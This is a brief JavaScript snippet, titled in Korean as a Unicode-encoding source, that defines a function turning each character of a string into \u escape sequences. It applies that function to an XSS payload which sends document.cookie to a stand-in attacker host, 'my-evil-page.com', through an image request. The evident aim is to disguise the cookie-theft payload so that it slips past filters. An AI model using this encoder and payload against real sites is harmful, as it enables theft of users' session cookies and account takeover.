# 자바스크립트 유니코드 인코딩 소스
``` js
u = s => s.split('')
           .map( c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0') )
           .join('');
u('new Image().src = "https://my-evil-page.com/?cookie=" + document.cookie;')
```